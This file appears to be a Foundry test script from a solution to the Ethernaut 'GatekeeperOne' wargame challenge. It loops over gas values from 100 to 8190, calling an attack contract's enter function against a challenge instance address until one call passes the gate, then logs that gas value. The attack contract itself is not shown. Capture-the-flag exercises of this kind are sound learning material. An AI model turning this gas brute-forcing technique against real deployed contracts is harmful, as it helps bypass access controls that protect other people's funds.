// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "GatekeeperOne.sol";

contract AttackGatekeeperOne is Test {
    GatekeeperOne private target;
    Attack private attack;

    function setUp() public {
        // Replace the address with your instance address
        target = GatekeeperOne(0x1b937B4959a9546Af8C78Fb8B60B582C9Ea2D06f);
        attack = new Attack();
    }

    function test() public {
        for (uint256 i = 100; i < 8191; i++) {
            try attack.enter(address(target), i) {
                console.log("Gas: ", i);
                return;
            } catch {}
        }
        revert("All tests have failed");
    }
}
